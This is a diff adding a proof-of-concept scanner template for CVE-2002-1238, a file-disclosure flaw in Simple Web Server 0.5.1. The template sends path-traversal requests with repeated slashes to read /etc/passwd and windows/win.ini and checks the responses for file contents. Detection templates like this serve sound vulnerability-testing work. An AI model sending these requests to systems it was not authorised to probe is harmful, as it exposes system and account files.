@@ -1,0 +1,44 @@
+[info]
+author = "AVE"
+description = "检测 Peter Sandvik Simple Web Server 0.5.1 文件泄漏漏洞，通过发送含多个连续斜杠的 HTTP 请求绕过路径限制读取任意文件"
+id = "POC-AVE-2002-0562"
+name = "CVE-2002-1238 PoC"
+severity = "high"
+tags = ["cve-2002-1238"]
+vuln_id = [
+    "CVE-2002-1238",
+    "AVE-2002-0562",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}///etc/passwd"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "bin:",
+    "nobody:",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}///windows/win.ini"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "[fonts]",
+    "[extensions]",
+    "[mail]",
+]
